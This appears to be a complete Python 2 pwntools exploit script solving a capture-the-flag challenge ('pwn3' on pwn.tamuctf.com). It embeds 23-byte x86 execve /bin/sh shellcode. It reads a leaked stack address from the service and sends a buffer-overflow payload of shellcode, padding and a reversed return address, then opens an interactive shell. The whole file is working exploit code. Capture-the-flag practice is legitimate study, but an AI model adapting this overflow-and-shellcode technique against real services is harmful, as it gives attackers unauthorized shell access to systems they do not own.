#!/usr/bin/env python2
from pwn import *

# Linux/x86 execve /bin/sh shellcode 23 bytes
# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#conn = process('./pwn3')
conn = remote('pwn.tamuctf.com', 4323)
addr = conn.recvuntil('!', drop=False)[-9:-1]
addrl = map(''.join, zip(*[iter(addr)]*2))
addrl.reverse()
payload = shellcode + 'A'*(302-len(shellcode)) + ''.join([chr(int(b,16)) for b in addrl])
conn.sendline(payload)
conn.interactive()